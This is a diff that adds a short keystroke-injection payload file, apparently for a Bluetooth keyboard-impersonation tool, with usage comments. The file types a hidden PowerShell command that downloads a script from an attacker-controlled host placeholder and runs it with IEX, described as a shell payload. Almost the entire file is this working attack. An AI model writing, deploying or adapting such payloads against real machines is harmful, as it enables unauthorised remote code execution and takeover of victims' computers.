@@ -1,0 +1,7 @@
+REM Windows command execution via PowerShell download-cradle
+REM Tokens: {{ATTACKER_IP}}, {{HTTP_PORT}} (your listener for /s.ps1)
+REM Usage:
+REM   bthj impersonate --identity-name "<ikeyboard>" --script-file payloads/shell.txt \
+REM        --var ATTACKER_IP=10.0.0.5 --var HTTP_PORT=8000 --keyboard
+STRING powershell -NoProfile -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://{{ATTACKER_IP}}:{{HTTP_PORT}}/s.ps1')"
+ENTER
